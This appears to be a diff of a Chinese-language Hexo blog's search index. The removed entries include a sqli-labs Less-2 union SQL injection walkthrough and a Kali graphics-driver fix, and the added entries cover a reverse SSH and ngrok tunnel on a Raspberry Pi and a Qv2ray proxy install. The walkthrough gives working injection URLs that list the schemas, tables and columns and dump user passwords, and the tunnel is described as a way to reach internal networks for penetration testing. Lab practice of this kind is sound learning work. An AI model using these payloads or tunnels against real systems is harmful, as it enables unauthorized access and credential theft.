-<h3 id="2-观察页面返回，选择可以显示数据的位置，进行下一步的注入"><a href="#2-观察页面返回，选择可以显示数据的位置，进行下一步的注入" class="headerlink" title="2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入"></a>2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入</h3><p>我们输入<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union%20 select 1,2,3 --+</code><br>判断注入的位置上2和3</p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173813841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行的sql语句结果就是这个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173958524.png" alt="在这里插入图片描述"></p>
-<h3 id="3读取库的信息"><a href="#3读取库的信息" class="headerlink" title="3读取库的信息"></a>3读取库的信息</h3><p>输入的URL<code>http://192.168.0.104/Less-2/ ?id= -1 union  select 1,user(),3 --+</code></p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730174451652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="4-读取数据"><a href="#4-读取数据" class="headerlink" title="4.读取数据"></a>4.读取数据</h3><h4 id="1-查看数据库名"><a href="#1-查看数据库名" class="headerlink" title="1.查看数据库名"></a>1.查看数据库名</h4><p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 0,1),3 --+</code><br><strong>上面的URL介绍</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
-<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>用于查看行数，应为他只能显示一个，所以输出也只能一个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181715462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看其他下一个数据库</p>
-<p>URL<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select schema_name from information_schema.schemata   LIMIT 1,1),3 --+</code><br>结果<br>只要修改<code>LIMIT 0,1</code>改成1就可以了<br>可以看到显示出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730181935785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>1.2读取全部的库</strong><br>上面输出一个不太好<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><br>用到了group_concat()函数，<br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730175714834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="2-读取查表"><a href="#2-读取查表" class="headerlink" title="2.读取查表"></a>2.读取查表</h4><p>通过上面的查询找到数据库全部的数据库名<br>通过数据库名就可以查询表了</p>
-<p>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 --+</code></p>
-<p>URL介绍</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>叫表给显示出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730184527355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="3-查询列"><a href="#3-查询列" class="headerlink" title="3.查询列"></a>3.查询列</h4><p>通过上面的查询查询出来了库和表<br>通过上面的表查询列<br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 --+</code><br>URL介绍</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>这个的意思在上一个博客查看<a href="https://blog.csdn.net/qq_41860876/article/details/106837536">1. 网易web安全渗透 手动sql注入</a><br>用<code>group_concat()</code>叫所以库名都显示到一列中<br>结果<br>查看出来列了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730190143774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="4-读取数据-1"><a href="#4-读取数据-1" class="headerlink" title="4.读取数据"></a>4.读取数据</h4><p>通过上面的注入，知道了库，表，列<br>知道了全部就可以查询数据了<br>用这个<code>select 列名 from 库名.表名</code><br>URL地址<code>http://192.168.0.104/Less-2/ ?id= -1 union select 1,(select group_concat(password) from security.users),3 --+</code><br>结果<br>通过注入叫数据给输出出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730191432156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 网易web安全渗透  手动sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>树莓派，反向ssh，内网通过公网访问到其他内网</title>
+      <link href="/2020/08/27/%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%8C%E5%8F%8D%E5%90%91ssh%EF%BC%8C%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E5%88%B0%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%91/"/>
+      <url>/2020/08/27/%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%8C%E5%8F%8D%E5%90%91ssh%EF%BC%8C%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E5%88%B0%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%91/</url>
+      
+        <content type="html"><![CDATA[<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h2 id="简单说"><a href="#简单说" class="headerlink" title="简单说"></a>简单说</h2><p>a内网，b公网，c内网<br>在c内网怎么访问到a的内网里面，就和访问c内网其他主机一样？<br> 我研究了好长时间问过学习过10多年的大佬，还有其他厉害的大佬，其他人给的建议，和书籍还有百度，下面我就进行一下内网穿透，反向隧道，<br> 应为我的笔记本内网穿透没有什么太大的用处 ，可以用花生壳内网穿透很简单。就不多说了<br> 都是树莓派就不行了，如果进行，没有远程ssh就不行了，不能进行渗透测试，<br> 开始操作<br>在《树莓派渗透实战》书说的如果从外网访问内网，是访问不了的，反向ssh隧道从内网就可以做到<br>内网执行的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -fN -R 5555:localhost:22  root@公网ip</span><br></pre></td></tr></table></figure><p>服务器执行的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost -p5555</span><br></pre></td></tr></table></figure><h2 id="树莓派安装的是kali-linux系统-安装花生壳树莓派，"><a href="#树莓派安装的是kali-linux系统-安装花生壳树莓派，" class="headerlink" title="树莓派安装的是kali linux系统 安装花生壳树莓派，"></a>树莓派安装的是kali linux系统 安装花生壳树莓派，</h2><p>花生壳地址<a href="https://hsk.oray.com/download/">https://hsk.oray.com/download/</a><br>应为树莓派我安装的arm64位的，他只有32位的，安装不上<br>下面命令对32位的支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture armhf</span><br></pre></td></tr></table></figure><p>反正还是安装不是，不知道怎么回事<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604210928493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="树莓派用Sunny-Ngrok内网穿透"><a href="#树莓派用Sunny-Ngrok内网穿透" class="headerlink" title="树莓派用Sunny-Ngrok内网穿透"></a>树莓派用Sunny-Ngrok内网穿透</h2><p>官方<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060421113237.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sunny clientid  隧道id</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604211248679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>自启动<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a>官方说明</p><h2 id="1、下载客户端"><a href="#1、下载客户端" class="headerlink" title="1、下载客户端"></a>1、下载客户端</h2><p>这一步就都不用说了大家都知道怎么操作。下载完成之后将客户端执行文件移动到 /use/local/bin 目录下并给予可执行权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mv sunny &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br><span class="line">sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br></pre></td></tr></table></figure><h2 id="2、编写启动脚本"><a href="#2、编写启动脚本" class="headerlink" title="2、编写启动脚本"></a>2、编写启动脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;init.d&#x2F;sunny 启动脚本代码</span><br></pre></td></tr></table></figure><p>把代码里面的【隧道id】替换成自己的隧道id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh -e</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          ngrok.cc</span><br><span class="line"># Required-Start:    $network $remote_fs $local_fs</span><br><span class="line"># Required-Stop:     $network $remote_fs $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: autostartup of frp for Linux</span><br><span class="line">### END INIT INFO</span><br><span class="line"></span><br><span class="line">NAME&#x3D;sunny</span><br><span class="line">DAEMON&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;$NAME</span><br><span class="line">PIDFILE&#x3D;&#x2F;var&#x2F;run&#x2F;$NAME.pid</span><br><span class="line"></span><br><span class="line">[ -x &quot;$DAEMON&quot; ] || exit 0</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">      if [ -f $PIDFILE ]; then</span><br><span class="line">        echo &quot;$NAME already running...&quot;</span><br><span class="line">        echo -e &quot;\033[1;35mStart Fail\033[0m&quot;</span><br><span class="line">      else</span><br><span class="line">        echo &quot;Starting $NAME...&quot;</span><br><span class="line">        start-stop-daemon -S -p $PIDFILE -m -b -o -q -x $DAEMON -- clientid 隧道id || return 2</span><br><span class="line">        echo -e &quot;\033[1;32mStart Success\033[0m&quot;</span><br><span class="line">    fi</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">        echo &quot;Stoping $NAME...&quot;</span><br><span class="line">        start-stop-daemon -K -p $PIDFILE -s TERM -o -q || return 2</span><br><span class="line">        rm -rf $PIDFILE</span><br><span class="line">        echo -e &quot;\033[1;32mStop Success\033[0m&quot;</span><br><span class="line">    ;;</span><br><span class="line">  restart)</span><br><span class="line">    $0 stop &amp;&amp; sleep 2 &amp;&amp; $0 start</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: $0 &#123;start|stop|restart&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3、测试可执行代码"><a href="#3、测试可执行代码" class="headerlink" title="3、测试可执行代码"></a>3、测试可执行代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 755 &#x2F;etc&#x2F;init.d&#x2F;sunny</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start    #启动</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny stop     #停止</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny restart  #重启</span><br></pre></td></tr></table></figure><h2 id="4、设置开机启动"><a href="#4、设置开机启动" class="headerlink" title="4、设置开机启动"></a>4、设置开机启动</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/init.d</span><br><span class="line">sudo update-rc.d sunny defaults <span class="number">90</span>    <span class="comment">#加入开机启动</span></span><br><span class="line">sudo update-rc.d -f sunny remove  <span class="comment">#取消开机启动</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060422195522.png" alt="在这里插入图片描述"></p><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
+      
+      
       <categories>
-        <category>sql注入</category>
+          
+          <category> 内网穿透 </category>
+          
       </categories>
-      <tags>
-        <tag>union联合查询注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决显卡问题，kali启动死循环&quot; 5.921.261] nouveau 0000:01:00.0:&quot;</title>
-    <url>/2020/08/27/%E8%A7%A3%E5%86%B3%E6%98%BE%E5%8D%A1%E9%97%AE%E9%A2%98%EF%BC%8Ckali%E5%90%AF%E5%8A%A8%E6%AD%BB%E5%BE%AA%E7%8E%AF%205.921.261%5D%20nouveau%200000:01:00.0:/</url>
-    <content><![CDATA[<p>我的笔记本是winodws10和kali双系统<br>启动kali出现死循环5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06 ，就算重新装kali也是这个问题 ，根本就进不去系统,研究了多个深夜，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105630754.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"></p>
-<p>我花了很长时间琢磨摸索研究是什么问题，终于叫这个问题给解决了</p>
-<h2 id="摸索过程"><a href="#摸索过程" class="headerlink" title="摸索过程"></a>摸索过程</h2><p>，win10独立显卡驱动安装不上就算是安装上了，也不能用，报43错误，官方最新驱动以前的老驱动，重做系统，win10还是这样，我估计是独立显卡坏了，</p>
-<p>，启动kali无线<strong>5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06</strong> ，是显卡驱动nouveau  ，<br>然后我在百度上找了很多资料，<br>刚开始kali是好的，然后突然就出现了这个问题，有大神说可能所引导没有安装好，从新安装kali，也是没有解决这个问题，我想可能是我的镜像有问题，我计算了他的值和官方的值一样，说明镜像是没有问题的，找了很多方法，还是没有解决，已经到了深夜了，我最后看了一篇文字，<a href="https://blog.csdn.net/yaorengjin0808/article/details/81613331">https://blog.csdn.net/yaorengjin0808/article/details/81613331</a> 用了这个方法发现可以进入系统了，应为kali2020系统GRUB内核参数有变动，下面是我研究了好长时间，</p>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
-<li><p>进入系统，叫你选系统的时候按e键，进入编辑模式，</p>
-</li>
-<li><p>在这里添加这串字符<code>nouveau.modeset=0;</code>，splash在前面也可以<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105947952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   俺F10值启动发现就可以进入系统了<br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110429756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-</li>
-<li><p>添加GRUB添加内核参数<br>进入<code>sudo vim /etc/default/grub</code><br>添加这个<code>splash nouveau.modeset=0</code></p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110632400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"><br>命令<code>update-grub</code></p>
-<h2 id="解决这个问题参考了很多网上的资料，"><a href="#解决这个问题参考了很多网上的资料，" class="headerlink" title="解决这个问题参考了很多网上的资料，"></a>解决这个问题参考了很多网上的资料，</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2></li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 隧道 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux版qv2ray安装</title>
+      <link href="/2020/08/27/linux%E7%89%88qv2ray%E5%AE%89%E8%A3%85/"/>
+      <url>/2020/08/27/linux%E7%89%88qv2ray%E5%AE%89%E8%A3%85/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在国内有的网络技术文档都已经很老了，在外国能查看到新的互联网技术进行学习<br>废话不多说</p><ol><li>下载V2ray客户端<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/iIatmf0cmqf">https://wwa.lanzous.com/iIatmf0cmqf</a><br> 更多其他系统版本<br> <a href="https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6">https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6</a></li><li>下载核心<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/ixPOUf0cpyb">https://wwa.lanzous.com/ixPOUf0cpyb</a><br> 更多其他系统版本<br> <a href="https://github.com/v2fly/v2ray-core/releases">https://github.com/v2fly/v2ray-core/releases/</a></li></ol><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>我创建了一个v2ray文件夹里面是解压好的下载的核心和V2ray客户端<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726184523611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol><li><p>然后在终端输入运行<br> 给他执行权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x .&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage </span><br></pre></td></tr></table></figure><p> 运行</p></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage </span><br></pre></td></tr></table></figure></code></pre><ol start="2"><li>设置<br> 设置中文<br> 他默认是英文的<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726192820628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol><p><strong>添加核心</strong><br>上面下载的核心文件里面的执行文件<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726194038573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加上面解压出来了的核心文件的根目录<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020072619422713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
+      
+      
       <categories>
-        <category>解决显卡问题</category>
+          
+          <category> 代理 </category>
+          
       </categories>
-      <tags>
-        <tag>解决显卡问题</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 客户端代理 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
